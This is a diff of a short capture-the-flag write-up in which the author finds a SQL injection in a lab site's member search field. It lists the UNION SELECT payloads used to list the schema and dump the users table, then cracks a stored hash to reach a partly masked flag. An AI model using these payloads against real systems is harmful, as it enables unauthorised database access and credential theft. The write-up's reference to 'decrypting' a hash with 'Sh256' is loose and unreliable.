@@ -4,7 +4,7 @@ In the members page, the search field gives a feeling to try an SQL injection to
 
 # How to do that
 
-I send the script
+I send the query
 ```
 1 OR 1=1 UNION SELECT TABLE_NAME, COLUMN_NAME  FROM INFORMATION_SCHEMA.COLUMNS
 ```
@@ -13,7 +13,7 @@ then after a lot of checks we checks only on the users table
 ```
 1 OR 1=1 UNION SELECT Commentaire, countersign FROM users
 ```
-the original script:
+the original query:
 ```
 SELECT * FROM users WHERE id = 'user_input';
 ```
@@ -29,7 +29,10 @@ First name: Decrypt this password -> then lower all the char. Sh256 on it and it
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
 ```
 
-After the Sh256 decryption the flag we get is:
+After derypting the surname  we get: FortyTwo
+which is is in lowercase fortytwo
+
+Then we use the Sh256 encryption to get the flag:
 ```
 9995cae900a927ab1500d317dfcXXXXXXXXXXXXXXXXXXXXX
 ```
